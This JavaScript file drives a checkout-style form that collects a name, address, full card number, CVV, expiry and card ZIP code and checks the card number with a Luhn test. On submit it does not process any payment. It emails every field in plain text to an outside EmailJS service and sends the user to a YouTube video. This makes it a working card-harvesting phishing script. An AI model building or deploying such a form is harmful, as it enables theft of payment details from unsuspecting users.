const form = document.getElementById('user-information');
var valid = true;

function setValid(event) {
    event.target.setCustomValidity("");
    event.target.reportValidity();
}

function invalidate(element, message) {
    element.setCustomValidity(message);
    element.reportValidity();
    valid = false;
}

function validateCard(cardnumber) {
    let sum = 0;
    let double = cardnumber.length % 2;
    for (let i = cardnumber.length-1; i >= 0; i--) {
        let num = parseInt(cardnumber.charAt(i));
        if (i % 2 == double) num *= 2;
        if (num >= 10) {
            let numStr = num.toString();
            num = parseInt(numStr.charAt(0)) + parseInt(numStr.charAt(1));
        }
        console.log("Validate Card (" + i + "): " + num);
        sum += num;
    }
    console.log("Validate Card: " + sum);
    return sum % 10 == 0;
}

function validateForm(elements) {
    for (let i = 0; i < form.elements.length; i++) {
        if (elements[i].name === "address-line-2" || (elements[i].type != "text" && elements[i].type != "month")) continue;
        if (elements[i].value.length === 0) invalidate(elements[i], "This cannot be blank!");
    }
    if (!elements["address-state"].value.match(/^\w{2}$/g)) invalidate(elements["address-state"], "Please enter a valid state code (For example: CA)");
    if (!elements["address-zip-code"].value.match(/^\d{5}$/g)) invalidate(elements["address-zip-code"], "Please enter a valid zip code (For example: 90840)");
    if (!elements["card-zip-code"].value.match(/^\d{5}$/g)) invalidate(elements["card-zip-code"], "Please enter a valid zip code (For example: 90840)");
    if (!elements["card-number"].value.match(/^\d{16}$/g)) invalidate(elements["card-number"], "This is not a valid card number.");
    if (!validateCard(elements["card-number"].value)) invalidate(elements["card-number"], "This is not a valid card number.");
    if (!elements["cvv"].value.match(/^\d{3}$/g)) invalidate(elements["cvv"], "Please enter a CVV code.");
}

function formProcess(event) {
    valid = true;
    event.preventDefault();

    let elements = form.elements;
    validateForm(elements);

    if (!valid) return;

    var messageContents = "User Information:\n";
    for (let i = 0; i < form.elements.length; i++) {
        if (elements[i].type != "text" && elements[i].type != "month") continue;
        messageContents += "- " + elements[i].name + ": " + elements[i].value + "\n";
    }

    var templateParams = {
        message: messageContents
    };
    console.log(messageContents);
    emailjs.send('service_0evt78l', 'template_xdsrpln', templateParams);
    setTimeout(function() { window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1000);
}

function removeNonDigits(event) {
    event.target.value = event.target.value.replace(/[^\d]/g, "");
}

form.addEventListener('submit', formProcess);
form.elements['first-name'].addEventListener('change', setValid);
form.elements['last-name'].addEventListener('change', setValid);
form.elements['address-line-1'].addEventListener('change', setValid);
form.elements['address-city'].addEventListener('change', setValid);
form.elements['address-state'].addEventListener('change', setValid);
form.elements['address-zip-code'].addEventListener('change', setValid);
form.elements['card-name'].addEventListener('change', setValid);
form.elements['card-number'].addEventListener('change', setValid);
form.elements['cvv'].addEventListener('change', setValid);
form.elements['month'].addEventListener('change', setValid);
form.elements['card-zip-code'].addEventListener('change', setValid);

form.elements['card-number'].addEventListener('input', removeNonDigits);
form.elements['cvv'].addEventListener('input', removeNonDigits);
form.elements['address-zip-code'].addEventListener('input', removeNonDigits);
form.elements['card-zip-code'].addEventListener('input', removeNonDigits);